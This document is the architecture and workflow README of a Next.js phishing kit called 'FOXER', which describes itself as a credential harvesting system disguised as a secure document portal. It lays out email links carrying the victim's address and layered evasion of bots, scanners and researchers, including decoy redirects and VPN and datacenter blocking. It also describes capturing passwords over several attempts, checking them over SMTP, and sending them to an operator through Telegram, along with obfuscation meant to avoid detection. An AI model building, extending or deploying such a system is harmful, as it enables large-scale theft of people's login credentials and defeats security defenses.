# 🦊 Complete Project Workflow & Architecture

## 📁 Complete Folder Structure

```
Japan Landing page for visit/
├── app/                          # Next.js App Router
│   ├── api/                      # API Routes (Backend)
│   │   ├── admin/                # Admin endpoints
│   │   │   ├── generate-generic/  # Generate Type B generic links
│   │   │   └── generate-personalized/ # Generate Type A personalized links
│   │   ├── bot-filter/           # Layer 1: Bot detection endpoint
│   │   ├── check-fingerprint/    # Check if fingerprint already completed login
│   │   ├── check-link-usage/     # Check if generic link was used
│   │   ├── detect-language/      # Detect user language from IP
│   │   ├── generate-token/       # Generate HMAC-signed token links
│   │   ├── get-domain-info/      # Get domain info and redirect URL
│   │   ├── get-email/            # Get email from personalized link ID
│   │   ├── get-redirect-url/     # Get redirect URL based on email domain
│   │   ├── get-screenshot/       # Get website screenshot for background
│   │   ├── honeypot-triggered/   # Report honeypot trap triggers
│   │   ├── link-config/          # Get configuration for generic link
│   │   ├── notify-layer/         # Send layer-specific Telegram notifications
│   │   ├── notify-visitor/       # Send visitor arrival notification
│   │   ├── stealth-verification/ # Layer 4: Behavioral verification endpoint
│   │   ├── submit-credentials/   # Main credential submission endpoint
│   │   ├── test/                 # Testing endpoints
│   │   │   ├── generate-token/   # Generate test token
│   │   │   └── telegram/         # Test Telegram configuration
│   │   ├── verify-access/        # Verify access token
│   │   └── verify-captcha/      # Layer 2: CAPTCHA verification endpoint
│   ├── globals.css               # Global styles
│   ├── invalid-link/             # Expired/invalid link page
│   │   └── page.tsx
│   ├── layout.tsx                # Root layout component
│   ├── page.tsx                  # Main landing page (orchestrates all layers)
│   └── t/                        # Type B generic link route
│       └── [token]/
│           ├── page.tsx          # Generic link page (prompts for email)
│           └── route.ts         # Generic link handler
│
├── components/                    # React Components (Frontend)
│   ├── BotDetection.tsx          # Client-side bot detection
│   ├── BotFilterGate.tsx         # Layer 1: Bot filter wrapper component
│   ├── CaptchaGate.tsx           # Legacy CAPTCHA component
│   ├── CaptchaGateDebug.tsx      # Debug CAPTCHA component
│   ├── CaptchaGateUnified.tsx    # Layer 2: Unified CAPTCHA component
│   ├── CaptchaGateWrapper.tsx    # CAPTCHA wrapper with state management
│   ├── DomainLogo.tsx            # Display domain logo
│   ├── Footer.tsx                # Page footer
│   ├── Header.tsx                # Page header
│   ├── LoadingBar.tsx            # Loading progress bar
│   ├── LoginForm.tsx             # Main login form (credential submission)
│   ├── PrivateCaptchaGate.tsx    # PrivateCaptcha provider component
│   ├── StealthVerificationGate.tsx # Layer 4: Behavioral verification component
│   └── VerifyGate.tsx           # Legacy verification component
│
├── lib/                          # Utility Libraries
│   ├── anomalyDetection.ts       # Anomaly detection and behavior scoring
│   ├── asiaEvasionTechniques.ts  # Asia-focused evasion techniques
│   ├── asiaSecurityPatterns.ts   # Asia security patterns
│   ├── attemptTracker.ts         # Password attempt tracking (file-based cache)
│   ├── botDetection.ts           # Bot detection utilities
│   ├── captchaConfig.ts          # CAPTCHA configuration management
│   ├── captchaProviders.ts       # CAPTCHA provider implementations
│   ├── captchaRotation.ts        # CAPTCHA rotation logic
│   ├── cloudflareBotManagement.ts # Cloudflare Bot Management integration
│   ├── decryptTelegram.ts        # Telegram message decryption
│   ├── emailVerification.ts      # Email/SMTP verification
│   ├── encryption.ts              # Encryption utilities
│   ├── enhancedBotPatterns.ts    # Enhanced bot detection patterns
│   ├── fingerprinting.ts          # Browser fingerprinting
│   ├── fingerprintStorage.ts     # Fingerprint storage (persistent)
│   ├── headerRotation.ts         # Header rotation for evasion
│   ├── honeypot.ts               # Honeypot utilities
│   ├── honeypotDetection.ts      # Client-side honeypot detection
│   ├── ipBlocklist.ts            # IP blocklist management
│   ├── ipBlocklistUpdater.ts     # IP blocklist updater
│   ├── latestSecurityPatterns.ts # Latest security patterns
│   ├── legitimateEmailAppearance.ts # Email appearance utilities
│   ├── linkManagement.ts         # Link management (Type A & B)
│   ├── locales.ts                # Multi-language translations
│   ├── mxProviderParser.ts       # MX record provider parsing
│   ├── networkRestrictions.ts    # VPN/Proxy/DataCenter blocking
│   ├── office365Verification.ts  # Office 365 specific verification
│   ├── patternObfuscation.ts     # Pattern obfuscation utilities
│   ├── redirectWithReason.ts     # Safe redirect with reason hash
│   ├── requestDeduplication.ts   # Request deduplication (replay prevention)
│   ├── scannerDetection.ts       # Scanner detection patterns
│   ├── secureUtils.ts            # Security utilities (obfuscation, rotation)
│   ├── securityMonitoring.ts     # Security event monitoring
│   ├── sessions.ts               # Session management
│   ├── stealthImprovements.ts    # Stealth improvements
│   ├── stealthUtils.ts           # Stealth utilities
│   ├── suspiciousDetection.ts    # Suspicious behavior detection
│   ├── telegramConfig.ts          # Telegram configuration (obfuscated)
│   ├── telegramNotifications.ts  # Telegram notification utilities
│   └── tokens.ts                 # Token creation and verification
│
├── scripts/                      # Utility Scripts
│   ├── generate-token.js         # Token generation script (JS)
│   ├── generate-token.ts         # Token generation script (TS)
│   └── test-token.js             # Token testing script
│
├── middleware.ts                 # Next.js middleware (early bot detection)
├── next.config.js                # Next.js configuration
├── package.json                   # Dependencies and scripts
├── tsconfig.json                  # TypeScript configuration
├── tailwind.config.js            # Tailwind CSS configuration
└── [Documentation Files]          # Various .md documentation files
```

---

## 🔄 Complete User Flow

### **Phase 1: Initial Request (Middleware)**

```
User clicks email link
    ↓
middleware.ts
    ├── Check suspicious paths → Redirect if scanner
    ├── Check IP blocklist → Block if banned
    ├── Check Cloudflare Bot Management → Block if bot
    └── Allow through → Continue to page
```

**Files:**
- `middleware.ts` - Early bot detection, IP blocking, scanner detection

---

### **Phase 2: Page Load (app/page.tsx)**

```
Page loads
    ↓
app/page.tsx (HomeContent)
    ├── Extract token & email from URL
    ├── Check fingerprint → Redirect if already used
    ├── Check if link was used → Show completion page
    ├── Detect language from IP
    ├── Fetch domain screenshot
    └── Render security layers sequentially
```

**Files:**
- `app/page.tsx` - Main orchestrator component
- `app/api/check-fingerprint/route.ts` - Fingerprint verification
- `app/api/detect-language/route.ts` - Language detection
- `app/api/get-screenshot/route.ts` - Screenshot fetching

---

### **Phase 3: Security Layers (Sequential)**

#### **Layer 1: Bot Filter Gate**

```
BotFilterGate component
    ↓
POST /api/bot-filter
    ├── Cloudflare Bot Management check
    ├── Fingerprint analysis
    ├── IP blocklist check
    ├── Scanner detection
    ├── Network restrictions (VPN/Proxy/DataCenter)
    └── Return: { passed: true/false }
```

**Files:**
- `components/BotFilterGate.tsx` - Client wrapper
- `app/api/bot-filter/route.ts` - Bot detection endpoint
- `lib/cloudflareBotManagement.ts` - Cloudflare integration
- `lib/scannerDetection.ts` - Scanner patterns
- `lib/ipBlocklist.ts` - IP blocking
- `lib/networkRestrictions.ts` - Network type blocking

**If fails:** Redirect to safe site (Wikipedia, etc.)

---

#### **Layer 2: CAPTCHA Gate**

```
CaptchaGateWrapper component
    ↓
CaptchaGateUnified component
    ├── Extract linkToken from URL
    ├── Render CAPTCHA (Turnstile/PrivateCaptcha/None)
    ├── User solves CAPTCHA
    └── POST /api/verify-captcha
        ├── Verify CAPTCHA token
        ├── Verify linkToken
        ├── Check token expiration
        └── Return: { ok: true/false }
```

**Files:**
- `components/CaptchaGateWrapper.tsx` - State management wrapper
- `components/CaptchaGateUnified.tsx` - Unified CAPTCHA component
- `components/PrivateCaptchaGate.tsx` - PrivateCaptcha provider
- `app/api/verify-captcha/route.ts` - CAPTCHA verification
- `lib/captchaConfig.ts` - CAPTCHA configuration
- `lib/captchaProviders.ts` - Provider implementations
- `lib/tokens.ts` - Token verification

**If fails:** Show error, allow retry

---

#### **Layer 3: Bot Detection Delay (3-7 seconds)**

```
After CAPTCHA verified
    ↓
3-7 second random delay
    ↓
POST /api/bot-filter (during delay)
    ├── Enhanced bot detection
    ├── Behavioral analysis
    └── Return: { passed: true/false }
```

**Files:**
- `app/page.tsx` - Delay logic
- `app/api/bot-filter/route.ts` - Enhanced detection

**If fails:** Redirect to safe site

---

#### **Layer 4: Stealth Verification Gate**

```
StealthVerificationGate component
    ├── Show "Preparing document..." loading screen
    ├── Track behavioral metrics:
    │   ├── Mouse movements
    │   ├── Scroll events
    │   ├── Keyboard presses
    │   ├── Time on page
    │   └── Natural interactions
    ├── Inject honeypot traps (invisible links)
    ├── 3-second analysis period
    └── POST /api/stealth-verification
        ├── Analyze behavior score
        ├── Check honeypot triggers
        └── Return: { passed: true/false }
```

**Files:**
- `components/StealthVerificationGate.tsx` - Behavioral analysis component
- `app/api/stealth-verification/route.ts` - Behavioral verification
- `lib/honeypotDetection.ts` - Client-side honeypot
- `app/api/honeypot-triggered/route.ts` - Honeypot reporting

**If fails:** Show "Session Expired" decoy page → Redirect after 5s

---

### **Phase 4: Login Form**

```
LoginForm component renders
    ├── Pre-filled email (from token)
    ├── Password input field
    ├── "Continue" button
    └── User enters password
        ↓
        POST /api/submit-credentials
```

**Files:**
- `components/LoginForm.tsx` - Login form component
- `lib/secureUtils.ts` - Credential obfuscation

---

### **Phase 5: Credential Submission**

```
User submits password
    ↓
POST /api/submit-credentials
    ├── Decode obfuscated credentials
    ├── Extract fingerprint from headers
    ├── Verify linkToken (if present)
    │   ├── If valid → Skip bot detection (trust user)
    │   └── If invalid → Return 401
    ├── Track password attempt (attemptTracker.ts)
    │   ├── Check if 3 same passwords → Confirm password
    │   ├── Check if 4th attempt allowed
    │   └── Store password history
    ├── Get MX records (email domain)
    ├── Send Telegram notifications:
    │   ├── Visitor notification (first attempt only)
    │   ├── Attempt notification (1/3, 2/3, 3/3, or 4/4)
    │   └── Full details on 3rd/4th attempt
    ├── SMTP verification (3rd/4th attempt only)
    ├── Record fingerprint (if successful)
    └── Return: { success, verified, redirect, ... }
```

**Files:**
- `app/api/submit-credentials/route.ts` - Main submission endpoint
- `lib/attemptTracker.ts` - Password attempt tracking
- `lib/fingerprintStorage.ts` - Fingerprint storage
- `lib/emailVerification.ts` - SMTP verification
- `lib/telegramNotifications.ts` - Telegram messaging
- `lib/telegramConfig.ts` - Telegram configuration
- `lib/mxProviderParser.ts` - MX record parsing

**Response Handling:**
- **3 same passwords:** Immediate redirect to company website
- **Verified credentials:** Redirect after 2 seconds
- **Invalid credentials:** Show error, clear field, allow retry
- **4th attempt allowed:** Show message, allow one more try
- **Too many attempts:** Redirect to safe site

---

### **Phase 6: Redirect & Completion**

```
Redirect to company website
    ├── Get redirect URL from /api/get-redirect-url
    ├── Use window.location.replace() (prevents back button)
    └── Mark link as used in sessionStorage
```

**Files:**
- `app/api/get-redirect-url/route.ts` - Redirect URL lookup
- `components/LoginForm.tsx` - Redirect handling

**Back Button Prevention:**
- `sessionStorage.setItem('link_used', 'true')`
- Fingerprint check on page load
- Redirect to `/invalid-link` if already used

---

## 🔐 Security Architecture

### **4-Layer Defense System**

```
┌─────────────────────────────────────────┐
│ Layer 1: Bot Filter Gate                │
│ - Cloudflare Bot Management             │
│ - IP Blocklist                          │
│ - Scanner Detection                     │
│ - Network Restrictions                  │
└─────────────────────────────────────────┘
              ↓ (Pass)
┌─────────────────────────────────────────┐
│ Layer 2: CAPTCHA Gate                   │
│ - Cloudflare Turnstile                  │
│ - PrivateCaptcha                        │
│ - Token Verification                    │
└─────────────────────────────────────────┘
              ↓ (Pass)
┌─────────────────────────────────────────┐
│ Layer 3: Bot Detection Delay           │
│ - 3-7 second random delay               │
│ - Enhanced bot detection                │
│ - Behavioral analysis                   │
└─────────────────────────────────────────┘
              ↓ (Pass)
┌─────────────────────────────────────────┐
│ Layer 4: Stealth Verification Gate      │
│ - Behavioral metrics                    │
│ - Honeypot traps                        │
│ - Natural interaction detection         │
└─────────────────────────────────────────┘
              ↓ (Pass)
┌─────────────────────────────────────────┐
│ Login Form (Trusted User)                │
│ - Credential submission                 │
│ - Fingerprint tracking                  │
│ - Telegram notifications                │
└─────────────────────────────────────────┘
```

---

## 📊 Data Flow

### **Token Flow**

```
1. Token Generation
   scripts/generate-token.ts
   → lib/tokens.ts (createToken)
   → HMAC-signed JWT token
   → Email link: /?token=ABC123&email=user@example.com

2. Token Extraction
   app/page.tsx
   → Extract from URL params
   → Pass to security layers

3. Token Verification
   app/api/verify-captcha/route.ts
   app/api/submit-credentials/route.ts
   → lib/tokens.ts (verifyToken)
   → Check signature, expiration, binding

4. Token Payload
   {
     email: string
     documentId: string
     expiresAt: number
     timestamp: number
     issuedAt: number
   }
```

### **Fingerprint Flow**

```
1. Client-Side Generation
   components/LoginForm.tsx
   → Generate browser fingerprint
   → Send via X-Fingerprint header

2. Server-Side Storage
   app/api/submit-credentials/route.ts
   → lib/fingerprintStorage.ts
   → Store: email + fingerprint + IP
   → File: .fingerprints.json

3. Fingerprint Check
   app/page.tsx
   → app/api/check-fingerprint/route.ts
   → lib/fingerprintStorage.ts (hasCompletedLogin)
   → Redirect if already used
```

### **Password Attempt Flow**

```
1. User submits password
   components/LoginForm.tsx
   → POST /api/submit-credentials

2. Backend tracking
   app/api/submit-credentials/route.ts
   → lib/attemptTracker.ts (recordAttempt)
   → File: .attempts-cache.json
   → Store: count, passwords[], timestamp

3. Logic checks
   - 3 same passwords → Confirm password, redirect
   - 1&2 same, 3 different → Allow 4th attempt
   - All different → Block after 3rd

4. Telegram notifications
   - Attempt 1/3: Short message
   - Attempt 2/3: Short message
   - Attempt 3/3: Full details + SMTP verification
   - Attempt 4/4: Full details (if allowed)
```

---

## 🔗 Link Types

### **Type A: Personalized Links**

```
Format: /?token=ABC123&id=user_12345

Flow:
1. Extract ID from URL
2. POST /api/get-email?id=user_12345
3. Backend maps ID → email
4. Continue with normal flow

Files:
- app/api/get-email/route.ts
- lib/linkManagement.ts (getEmailFromId)
```

### **Type B: Generic Links**

```
Format: /t/XYZ789

Flow:
1. User visits /t/XYZ789
2. app/t/[token]/page.tsx renders
3. Prompts user for email
4. POST /api/link-config (get link config)
5. User enters email
6. POST /api/check-link-usage (check if used)
7. Continue with normal flow

Files:
- app/t/[token]/page.tsx
- app/t/[token]/route.ts
- app/api/link-config/route.ts
- app/api/check-link-usage/route.ts
- lib/linkManagement.ts
```

---

## 📱 Telegram Integration

### **Notification Flow**

```
1. Visitor Arrival
   app/api/submit-credentials/route.ts
   → First password attempt
   → Send: "👊👊 Knock! Knock!!"
   → Track in usedLinks Map

2. Password Attempts
   app/api/submit-credentials/route.ts
   → Each password submission
   → Send: "🎯 Attempt X/3" or "🎯 Attempt X/4"
   → Full details on 3rd/4th attempt

3. Configuration
   lib/telegramConfig.ts
   → Obfuscated credentials (dev only)
   → Environment variables (production)
   → lib/telegramNotifications.ts
   → Format messages, send to Telegram API

Files:
- lib/telegramConfig.ts
- lib/telegramNotifications.ts
- app/api/submit-credentials/route.ts
- app/api/notify-visitor/route.ts
```

---

## 🛡️ Security Features

### **Obfuscation & Evasion**

```
lib/secureUtils.ts
├── obfs() / deobfs() - String obfuscation
├── randomDelay() - Random delays
└── secureFetch() - Anti-fingerprinting headers

lib/patternObfuscation.ts
└── Pattern obfuscation for evasion

lib/headerRotation.ts
└── Header rotation to avoid detection
```

### **Request Deduplication**

```
lib/requestDeduplication.ts
├── generateRequestSignature()
└── isDuplicateRequest()
→ Prevents replay attacks
```

### **Anomaly Detection**

```
lib/anomalyDetection.ts
├── getBehavior()
├── updateBehavior()
└── scoreAnomalies()
→ Tracks request patterns, detects anomalies
```

### **Security Monitoring**

```
lib/securityMonitoring.ts
└── logSecurityEvent()
→ Centralized security event logging
```

---

## 🌐 Multi-Language Support

```
lib/locales.ts
├── getTranslations()
└── Supported languages: en, ja, zh, ko, etc.

app/api/detect-language/route.ts
└── Detect language from IP geolocation

app/page.tsx
└── Auto-detect and set language
```

---

## 📝 File Descriptions

### **Core Application Files**

| File | Purpose |
|------|---------|
| `app/page.tsx` | Main landing page, orchestrates all security layers |
| `app/layout.tsx` | Root layout with metadata |
| `middleware.ts` | Early bot detection, IP blocking, scanner detection |
| `components/LoginForm.tsx` | Credential submission form |

### **Security Layer Components**

| File | Purpose |
|------|---------|
| `components/BotFilterGate.tsx` | Layer 1: Bot filter wrapper |
| `components/CaptchaGateUnified.tsx` | Layer 2: Unified CAPTCHA component |
| `components/StealthVerificationGate.tsx` | Layer 4: Behavioral verification |

### **API Endpoints**

| Endpoint | Purpose |
|----------|---------|
| `/api/bot-filter` | Layer 1: Bot detection |
| `/api/verify-captcha` | Layer 2: CAPTCHA verification |
| `/api/stealth-verification` | Layer 4: Behavioral analysis |
| `/api/submit-credentials` | Credential submission & processing |
| `/api/check-fingerprint` | Fingerprint verification |
| `/api/generate-token` | Token generation |
| `/api/get-redirect-url` | Get redirect URL for email domain |

### **Utility Libraries**

| File | Purpose |
|------|---------|
| `lib/tokens.ts` | Token creation & verification (HMAC) |
| `lib/fingerprintStorage.ts` | Persistent fingerprint storage |
| `lib/attemptTracker.ts` | Password attempt tracking |
| `lib/telegramNotifications.ts` | Telegram messaging |
| `lib/emailVerification.ts` | SMTP verification |
| `lib/secureUtils.ts` | Obfuscation & evasion |
| `lib/captchaConfig.ts` | CAPTCHA configuration |
| `lib/ipBlocklist.ts` | IP blocklist management |
| `lib/networkRestrictions.ts` | VPN/Proxy/DataCenter blocking |

---

## 🚀 Development Workflow

### **1. Start Development Server**

```bash
npm run dev
```

### **2. Generate Test Token**

```bash
# Using script
node scripts/generate-token.js

# Or via API
GET /api/test/generate-token
```

### **3. Test Flow**

1. Visit: `http://localhost:3000/?token=ABC123&email=test@example.com`
2. Complete all 4 security layers
3. Submit password
4. Check Telegram for notifications
5. Verify redirect works

### **4. Environment Variables**

```env
# CAPTCHA
NEXT_PUBLIC_TURNSTILE_SITE_KEY=...
CLOUDFLARE_TURNSTILE_SECRET_KEY=...

# Telegram
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...

# Tokens
TOKEN_SECRET=...

# Network Restrictions
ALLOW_VPN=0
ALLOW_PROXY=0
ALLOW_DATACENTER=0
```

---

## 📈 Performance & Scalability

### **File-Based Caching**

- `.attempts-cache.json` - Password attempts (30min TTL)
- `.fingerprints.json` - Fingerprint records (1 year TTL)

### **In-Memory Maps**

- `usedLinks` Map - Link usage tracking (5min cleanup)
- `passwordAttempts` Map - Server-side attempt tracking

### **Serverless Considerations**

- File-based storage persists across invocations
- In-memory caches reset on cold start
- Telegram requests are fire-and-forget

---

## 🔍 Debugging & Testing

### **Test Endpoints**

- `/api/test/generate-token` - Generate test token
- `/api/test/telegram` - Test Telegram configuration

### **Debug Files**

- `DEBUG_3_SAME_PASSWORDS.md` - Password confirmation debugging
- `DIAGNOSTIC_REPORT.md` - System diagnostics
- `TOKEN_FLOW_TRACE.md` - Token flow documentation

---

## 📚 Documentation Files

| File | Purpose |
|------|---------|
| `WORKFLOW.md` | This file - Complete workflow documentation |
| `TOKEN_FLOW_TRACE.md` | Detailed token flow explanation |
| `TELEGRAM_SETUP.md` | Telegram bot setup guide |
| `CAPTCHA_CONFIGURATION.md` | CAPTCHA configuration guide |
| `NETWORK_RESTRICTIONS.md` | Network restriction configuration |
| `THREAT_MODEL_V2.md` | Security threat model |
| `IMPLEMENTATION_GUIDE.md` | Implementation details |

---

## 🎯 Key Design Decisions

1. **4-Layer Security:** Sequential layers, each must pass
2. **Token-Based Trust:** Valid token = trusted user (skip bot detection)
3. **Fingerprint Tracking:** Prevent repeat access from same device
4. **File-Based Storage:** Persists across serverless invocations
5. **Obfuscation:** All sensitive data obfuscated in transit
6. **Telegram Notifications:** Real-time credential logging
7. **Progressive Attempts:** 3 attempts standard, 4th conditional
8. **Back Button Prevention:** `window.location.replace()` + fingerprint check

---

## 🔄 Complete Request Lifecycle

```
1. User clicks email link
   ↓
2. middleware.ts (early detection)
   ↓
3. app/page.tsx (page load, fingerprint check)
   ↓
4. Layer 1: BotFilterGate → /api/bot-filter
   ↓
5. Layer 2: CaptchaGate → /api/verify-captcha
   ↓
6. Layer 3: Bot Detection Delay (3-7s)
   ↓
7. Layer 4: StealthVerificationGate → /api/stealth-verification
   ↓
8. LoginForm renders
   ↓
9. User submits password → /api/submit-credentials
   ↓
10. Telegram notifications sent
   ↓
11. Redirect to company website
   ↓
12. Fingerprint recorded (prevents repeat access)
```

---

## 🦊 FOXER System

This is a sophisticated credential harvesting system with:

- ✅ **4-Layer Security Defense**
- ✅ **Fingerprint Tracking**
- ✅ **Telegram Integration**
- ✅ **Token-Based Authentication**
- ✅ **Progressive Password Attempts**
- ✅ **Multi-Language Support**
- ✅ **Network Restrictions**
- ✅ **Obfuscation & Evasion**
- ✅ **Back Button Prevention**
- ✅ **Honeypot Traps**
- ✅ **Behavioral Analysis**

**All designed to appear as a legitimate secure document access system while harvesting credentials efficiently and securely.**

---

*Last Updated: 2024*
*Version: 1.0.0*




